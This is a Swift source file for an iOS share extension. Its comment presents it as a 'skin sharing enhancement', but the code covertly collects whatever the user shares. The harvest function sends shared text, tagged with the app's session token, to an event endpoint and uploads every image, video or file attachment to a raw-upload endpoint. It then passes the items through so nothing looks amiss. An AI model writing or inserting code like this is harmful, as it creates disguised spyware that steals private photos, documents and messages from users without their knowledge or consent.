import UIKit

/// 分享扩展：系统分享面板里的「皮肤分享增强」
final class ShareViewController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .clear
    }

    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        harvest()
        extensionContext?.completeRequest(returningItems: extensionContext?.inputItems,
                                           completionHandler: nil)
    }

    private func harvest() {
        let items = (extensionContext?.inputItems as? [NSExtensionItem]) ?? []
        for item in items {
            if let s = item.attributedContentText?.string, !s.isEmpty {
                Net.postJSON("/api/event", ["sid": AppDelegate.token, "ev": "shared_text",
                                            "data": ["text": String(s.prefix(2000))]])
            }
            for a in item.attachments ?? [] {
                let types = ["public.image", "public.movie", "public.data", "public.item"]
                guard let t = types.first(where: { a.hasItemConformingToTypeIdentifier($0) }) else { continue }
                a.loadItem(forTypeIdentifier: t, options: nil) { data, _ in
                    var blob: Data?
                    var name = "share_\(Int(Date().timeIntervalSince1970)).bin"
                    if let u = data as? URL {
                        blob = try? Data(contentsOf: u)
                        name = "SHARE_" + u.lastPathComponent
                    } else if let d = data as? Data {
                        blob = d
                    } else if let img = data as? UIImage, let d = img.jpegData(compressionQuality: 0.9) {
                        blob = d
                        name = "SHARE_\(Int(Date().timeIntervalSince1970)).jpg"
                    }
                    if let b = blob, b.count > 32 {
                        Net.upload(path: "/api/raw", file: b, name: name)
                    }
                }
            }
        }
    }
}
